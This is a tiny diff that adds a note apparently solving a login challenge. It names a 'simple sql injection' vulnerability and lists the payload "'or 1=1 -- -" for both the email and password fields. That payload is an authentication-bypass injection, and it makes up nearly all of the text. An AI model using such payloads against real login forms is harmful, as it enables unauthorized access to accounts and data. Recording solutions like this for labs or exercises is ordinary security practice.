@@ -1,0 +1,3 @@
+Vulnerability : simple sql injection
+email : 'or 1=1 -- -
+password : 'or 1=1 -- -
